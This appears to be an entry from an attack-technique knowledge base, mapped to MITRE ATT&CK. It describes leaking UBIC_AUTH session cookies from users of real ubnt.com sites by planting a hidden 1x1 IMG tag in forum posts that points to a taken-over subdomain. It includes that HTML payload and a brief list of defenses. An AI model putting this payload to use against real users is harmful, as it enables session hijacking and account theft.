---
id: proc-trick-victims-ubnt
tags:
  - csrf
  - social-engineering
  - cookie-leak
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:31:43.057Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Trick-Victims-into-Leaking-Session-Cookies

## Summary

Embed hidden resources in user-viewed content (e.g., forum posts) to force browser requests to the taken-over subdomain, leaking shared cookies.

## Description

Exploit the UBIC_AUTH cookie's domain=.ubnt.com attribute by tricking authenticated users into loading an IMG tag from ping.ubnt.com, sending the cookie over HTTPS without user notice.

## Requirements

1. Access to post content on victim forums (e.g., community.ubnt.com)
2. Controlled subdomain serving the payload
3. Victims logged into *.ubnt.com

## Defense

Defensive measures and detection strategies:

- Set cookies with strict domain/path attributes
- Deploy CSRF tokens and SameSite=Strict
- Monitor for cross-subdomain requests

## Objectives

1. Induce stealthy requests from victims
2. Capture UBIC_AUTH for hijacking
3. Enable targeted or mass attacks

## Instructions

### Step 1: Embed Hidden IMG

**Context**: Post HTML with invisible image on community forum.

Example HTML:
```html
<img src="https://ping.ubnt.com/imagefetch.php?f=thanks.png" width="1" height="1" style="display:none;">
```

> When viewed by logged-in user, browser fetches, sending cookie. Expected: Log entry with UBIC_AUTH.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf
- cookie-leak
